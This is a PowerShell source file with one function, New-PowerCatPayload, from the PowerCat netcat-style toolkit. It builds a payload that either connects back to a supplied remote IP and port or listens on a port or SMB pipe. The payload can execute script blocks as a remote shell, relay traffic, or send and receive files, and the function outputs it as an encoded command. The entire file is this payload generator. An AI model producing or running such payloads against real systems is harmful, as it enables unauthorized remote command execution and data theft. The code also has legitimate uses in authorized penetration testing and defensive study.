function New-PowerCatPayload {
<#
Author: Jesse Davis (@secabstraction)
License: BSD 3-Clause
#>
[CmdletBinding(DefaultParameterSetName = 'Execute')]
    Param (
        [Parameter(Position = 0)]
        [Alias('m')]
        [ValidateSet('Smb', 'Tcp', 'Udp')]
        [String]$Mode = 'Tcp',

        [Parameter()]
        [Switch]$Listener,
        
        [Parameter(ParameterSetName = 'Execute')]
        [Alias('e')]
        [Switch]$Execute,
        
        [Parameter(ParameterSetName = 'Relay')]
        [Alias('r')]
        [String]$Relay,

        [Parameter(ParameterSetName = 'ReceiveFile')]
        [Alias('rf')]
        [String]$ReceiveFile,
    
        [Parameter(ParameterSetName = 'SendFile')]
        [Alias('sf')]
        [String]$SendFile,
    
        [Parameter()]
        [Alias('d')]
        [Switch]$Disconnect,
    
        [Parameter()]
        [Alias('t')]
        [Int]$Timeout = 60,
        
        [Parameter()]
        [ValidateSet('Ascii','Unicode','UTF7','UTF8','UTF32')]
        [String]$Encoding = 'Ascii'
    )
    DynamicParam {
        $ParameterDictionary = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        
        if ($Mode -eq 'Smb') { New-RuntimeParameter -Name PipeName -Type String -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary }
        else { New-RuntimeParameter -Name Port -Type Int -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary }
        
        if ($Mode -eq 'Tcp') { New-RuntimeParameter -Name SslCn -Type String -ParameterDictionary $ParameterDictionary }

        if (!$Listener.IsPresent) {
            $Ipv4 = [regex]"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
            New-RuntimeParameter -Name RemoteIp -Type String -Mandatory -Position 2 -ValidatePattern $Ipv4 -ParameterDictionary $ParameterDictionary
        }

        if ($Execute.IsPresent) { 
            New-RuntimeParameter -Name ScriptBlock -Type ScriptBlock -ParameterDictionary $ParameterDictionary 
            New-RuntimeParameter -Name ArgumentList -Type Object[] -ParameterDictionary $ParameterDictionary 
        }
        if ($Execute.IsPresent -and $Listener.IsPresent) { New-RuntimeParameter -Name KeepAlive -Type Switch -ParameterDictionary $ParameterDictionary }
        return $ParameterDictionary
    }
    Begin {
        $PayloadString = 'function New-RuntimeParameter {' + ${function:New-RuntimeParameter} + '}' 
        $PayloadString += 'function Test-Port {' + ${function:Test-Port} + '}' 
        if ($ParameterDictionary.SslCn.Value) { $PayloadString += 'function New-X509Certificate {' + ${function:New-X509Certificate} + '}' } 
        switch ($Mode) { 
            'Smb' { $PayloadString += 'function New-SmbStream {' + ${function:New-SmbStream} + '}' }
            'Tcp' { $PayloadString += 'function New-TcpStream {' + ${function:New-TcpStream} + '}' }
            'Udp' { $PayloadString += 'function New-UdpStream {' + ${function:New-UdpStream} + '}' }
        }
        $PayloadString += 'function Write-NetworkStream {' + ${function:Write-NetworkStream} + '}'
        $PayloadString += 'function Read-NetworkStream {' + ${function:Read-NetworkStream} + '}'
        $PayloadString += 'function Close-NetworkStream {' + ${function:Close-NetworkStream} + '}'
        if ($Listener.IsPresent) { 
            $PayloadString += 'function Start-PowerCat {' + ${function:Start-PowerCat} + "}`n"
            $PayloadString += "Start-PowerCat $Mode $($ParameterDictionary.Port.Value) $($ParameterDictionary.PipeName.Value)"
        }
        else { 
            $PayloadString += 'function Connect-PowerCat {' + ${function:Connect-PowerCat} + "}`n"
            $PayloadString += "Connect-PowerCat $Mode $($ParameterDictionary.RemoteIp.Value) $($ParameterDictionary.Port.Value) $($ParameterDictionary.PipeName.Value)"
        }
    }
    Process {
        if ($PSCmdlet.ParameterSetName -eq 'Execute') { 
            $PayloadString += ' -Execute'
            if ($ParameterDictionary.ScriptBlock.Value) { $PayloadString += " -ScriptBlock $($ParameterDictionary.ScriptBlock.Value)" }
            if ($ParameterDictionary.ArgumentList.Value) { $PayloadString += " -ArgumentList $($ParameterDictionary.ArgumentList.Value)" }
        }
        elseif ($PSCmdlet.ParameterSetName -eq 'Relay') { $PayloadString += " -Relay $Relay" }
        elseif ($PSCmdlet.ParameterSetName -eq 'SendFile') { $PayloadString += " -SendFile $SendFile" }
        elseif ($PSCmdlet.ParameterSetName -eq 'ReceiveFile') { $PayloadString += " -ReceiveFile $ReceiveFile" }
        if ($ParameterDictionary.KeepAlive.IsSet) { $PayloadString += ' -KeepAlive' }
        elseif ($Disconnect.IsPresent) { $PayloadString += ' -Disconnect' }
        if ($PSBoundParameters.Timeout) { $PayloadString += " -Timeout $Timeout" }
        if ($PSBoundParameters.Encoding) { $PayloadString += " -Encoding $Encoding" }
        if ($ParameterDictionary.SslCn.Value) { $PayloadString += " -SslCn $($ParameterDictionary.SslCn.Value)" }

        $ScriptBlock = [ScriptBlock]::Create($PayloadString)

        Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $ScriptBlock 
    }
    End {}
}